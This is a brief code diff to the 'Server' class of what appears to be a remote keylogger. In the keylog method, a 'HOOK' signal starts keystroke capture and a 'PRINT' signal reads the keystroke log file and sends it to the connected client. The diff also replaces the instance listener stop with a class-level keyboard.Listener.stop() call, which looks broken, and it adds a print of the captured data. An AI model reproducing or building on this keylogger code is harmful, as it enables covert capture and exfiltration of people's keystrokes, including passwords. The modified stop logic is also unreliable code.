@@ -332,7 +332,7 @@ class Server:
             return log_file.read()
         
     def stop_keylog (self):
-        self.listener.stop()
+        keyboard.Listener.stop()
         pass
     
     def keylog(self, conn):
@@ -342,6 +342,7 @@ class Server:
             s = self.receiveSignal(conn)
             if s == "PRINT":
                 data = self.read_log_file()
+                print(data)
                 self.clients.send(data.encode())
             elif s == "HOOK":
                 self.start_keylog()
